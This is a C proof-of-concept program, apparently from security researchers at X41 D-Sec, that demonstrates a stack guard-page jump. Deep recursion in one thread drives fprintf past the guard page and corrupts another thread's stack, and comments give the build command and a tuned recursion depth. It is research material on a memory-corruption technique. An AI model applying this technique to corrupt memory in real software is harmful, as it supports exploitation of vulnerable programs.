#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

void *t1_function( int *maxdepth );
void *t2_function( void *ptr );

static int cont = 1;

/*
 * Stack Overflow Memory Corruption
 * Guard Page Jump via fprintf
 * 2016 Markus Vervier, X41 D-Sec GmbH
 */

// gcc -g -lpthread -o threadrec threadrec.c 
//
// *** > run with argument 261881 as recursion depth
//

void main(int argc, char **argv)
{
	pthread_t thread1, thread2;
	const char *message1 = "Thread 1";
	int  iret1, iret2;

	if (argc < 2) {
		printf("usage: %s recursiondepth # (try 261880)\n");
		return;
	}

	int maxdepth = atoi(argv[1]);	

	/* Create independent threads each of which will execute function */		
	iret1 = pthread_create( &thread1, NULL, t1_function, (void*) &maxdepth);
	if(iret1)
	{
		fprintf(stderr,"Error - pthread_create() return code: %d\n",iret1);
		exit(EXIT_FAILURE);
	}

	iret2 = pthread_create( &thread2, NULL, t2_function, (void*) message1);
	if(iret2)
	{
		fprintf(stderr,"Error - pthread_create() return code: %d\n",iret2);
		exit(EXIT_FAILURE);
	}

	printf("pthread_create() for thread 1 returns: %d\n",iret1);
	printf("pthread_create() for thread 2 returns: %d\n",iret2);

	pthread_join( thread1, NULL);
	pthread_join( thread2, NULL);

	exit(EXIT_SUCCESS);

}

void r(int depth, int maxdepth) {
	if ((depth < maxdepth)) {
		r(++depth, maxdepth);
	} else {
		//		__asm__ __volatile__("int3");
		fprintf(stderr, "maxdepth baby: %d!AAAAAAAAAAAAAAAAAAAAAAAAAAA\n", depth); // CORRUPT STACK OF THREAD 2
		cont = 0;
	}
}

void *t1_function( int *maxdepth )
{
	printf("Thread 2\n");
	r(0,*maxdepth);
}

int check() {
	return cont;
}

void *t2_function( void *ptr )
{
	char *message;
	message = (char *) ptr;
	printf("%s\n", message);
	while(cont); // wait for the other thread to corrupt our stack ;)
}
